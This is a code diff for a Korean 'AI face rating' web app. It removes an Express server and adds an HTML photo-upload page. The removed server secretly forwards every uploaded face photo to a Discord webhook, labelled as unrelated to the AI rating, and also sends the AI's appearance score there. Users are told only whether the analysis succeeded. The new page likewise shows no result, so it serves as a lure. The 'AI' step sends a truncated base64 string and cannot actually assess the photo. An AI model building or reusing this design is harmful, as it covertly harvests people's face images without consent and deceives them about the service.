@@ -1,137 +1,166 @@
-import express from "express";
-import multer from "multer";
-import fs from "fs";
-import fetch from "node-fetch";
-import FormData from "form-data";
-import { OpenAI } from "openai";
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>AI 얼굴 평가</title>
 
-const app = express();
-const PORT = process.env.PORT || 10000;
-
-// 🔐 환경변수
-const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
-const OPENAI_API_KEY = process.env.OPENAI_API_KEY;
-
-// OpenAI (있어도 되고 없어도 됨)
-const openai = OPENAI_API_KEY
-  ? new OpenAI({ apiKey: OPENAI_API_KEY })
-  : null;
-
-// multer 설정
-const upload = multer({
-  dest: "uploads/",
-  limits: { fileSize: 5 * 1024 * 1024 } // 5MB
-});
-
-// uploads 폴더 보장
-if (!fs.existsSync("uploads")) {
-  fs.mkdirSync("uploads");
+<style>
+:root{
+  --teal:#14b8a6;
+  --teal-dark:#0f766e;
+  --bg:#f0fdfa;
+  --card:#ffffff;
+  --text:#0f172a;
 }
 
-app.use(express.json());
-app.use(express.static("."));
+*{ box-sizing:border-box; }
 
-app.post("/upload", upload.single("photo"), async (req, res) => {
-  if (!req.file) {
-    return res.status(400).json({ error: "사진 없음" });
-  }
+body{
+  margin:0;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+  background:linear-gradient(180deg,#ecfeff,#f0fdfa);
+  color:var(--text);
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
 
-  const filePath = req.file.path;
+.app{
+  width:100%;
+  max-width:420px;
+  padding:20px;
+}
 
-  // ===============================
-  // 1️⃣ 사진을 무조건 Discord로 먼저 전송
-  // ===============================
-  try {
-    const form = new FormData();
-    form.append("file", fs.createReadStream(filePath));
-    form.append(
-      "payload_json",
-      JSON.stringify({
-        username: "📸 얼굴 업로드",
-        content: "새로운 사진 업로드됨 (AI 평가와 무관)"
-      })
-    );
+.card{
+  background:var(--card);
+  border-radius:20px;
+  padding:24px;
+  box-shadow:0 20px 40px rgba(0,0,0,0.08);
+  text-align:center;
+}
 
-    await fetch(DISCORD_WEBHOOK, {
-      method: "POST",
-      body: form
+h1{
+  margin:0 0 20px;
+  font-size:24px;
+  font-weight:700;
+}
+
+.upload-box{
+  border:2px dashed var(--teal);
+  border-radius:16px;
+  padding:20px;
+  cursor:pointer;
+  transition:.2s;
+}
+
+.upload-box:hover{
+  background:#ecfeff;
+}
+
+.upload-box input{
+  display:none;
+}
+
+.preview{
+  margin-top:16px;
+}
+
+.preview img{
+  width:100%;
+  border-radius:16px;
+  object-fit:cover;
+}
+
+button{
+  margin-top:20px;
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:14px;
+  background:linear-gradient(135deg,var(--teal),var(--teal-dark));
+  color:white;
+  font-size:16px;
+  font-weight:600;
+  cursor:pointer;
+}
+
+button:disabled{
+  opacity:.6;
+}
+
+#status{
+  margin-top:16px;
+  font-size:14px;
+}
+</style>
+</head>
+
+<body>
+<div class="app">
+  <div class="card">
+    <h1>AI 얼굴 평가</h1>
+
+    <label class="upload-box">
+      사진 선택
+      <input type="file" id="photo" accept="image/*" />
+    </label>
+
+    <div class="preview" id="preview"></div>
+
+    <button id="submit" disabled>평가하기</button>
+
+    <div id="status"></div>
+  </div>
+</div>
+
+<script>
+const photoInput = document.getElementById("photo");
+const preview = document.getElementById("preview");
+const submitBtn = document.getElementById("submit");
+const statusEl = document.getElementById("status");
+
+let file = null;
+
+photoInput.addEventListener("change", () => {
+  file = photoInput.files[0];
+  if(!file) return;
+
+  const img = document.createElement("img");
+  img.src = URL.createObjectURL(file);
+  preview.innerHTML = "";
+  preview.appendChild(img);
+
+  submitBtn.disabled = false;
+});
+
+submitBtn.addEventListener("click", async () => {
+  if(!file) return;
+
+  submitBtn.disabled = true;
+  statusEl.textContent = "분석 중...";
+
+  const formData = new FormData();
+  formData.append("photo", file);
+
+  try{
+    const res = await fetch("/upload", {
+      method:"POST",
+      body:formData
     });
 
-    console.log("✅ 디스코드 사진 전송 성공");
-  } catch (err) {
-    console.error("❌ 디스코드 사진 전송 실패", err.message);
+    const data = await res.json();
+    statusEl.textContent =
+      data.ai === "success"
+        ? "분석 완료"
+        : "분석 실패";
+  }catch{
+    statusEl.textContent = "오류 발생";
   }
 
-  // ===============================
-  // 2️⃣ AI 평가 시도 (실패해도 OK)
-  // ===============================
-  let aiResult = {
-    success: false,
-    message: "AI 평가 실패"
-  };
-
-  if (openai) {
-    try {
-      const imageBuffer = fs.readFileSync(filePath);
-      const base64Image = imageBuffer.toString("base64").slice(0, 12000);
-
-      const completion = await openai.chat.completions.create({
-        model: "gpt-4o-mini",
-        messages: [
-          {
-            role: "system",
-            content: "너는 얼굴을 솔직하게 평가하는 AI다."
-          },
-          {
-            role: "user",
-            content: `
-이 얼굴 사진을 보고:
-- 동물상
-- 솔직한 외모 평가 (0~10점)
-JSON 형식으로만 답해라.
-
-Base64 이미지 일부:
-${base64Image}
-`
-          }
-        ]
-      });
-
-      aiResult = {
-        success: true,
-        raw: completion.choices[0].message.content
-      };
-
-      // AI 결과도 Discord로 추가 전송
-      await fetch(DISCORD_WEBHOOK, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          username: "🤖 AI 얼평 결과",
-          content: aiResult.raw
-        })
-      });
-
-      console.log("✅ AI 평가 성공");
-    } catch (err) {
-      console.error("⚠️ AI 실패:", err.message);
-    }
-  }
-
-  // ===============================
-  // 3️⃣ 사용자 응답 (AI 성공/실패만 알려줌)
-  // ===============================
-  res.json({
-    ok: true,
-    ai: aiResult.success ? "success" : "fail"
-  });
-
-  // ===============================
-  // 4️⃣ 파일 정리 (맨 마지막)
-  // ===============================
-  fs.unlink(filePath, () => {});
+  submitBtn.disabled = false;
 });
-
-app.listen(PORT, () => {
-  console.log(`Server running on ${PORT}`);
-});
+</script>
+</body>
+</html>
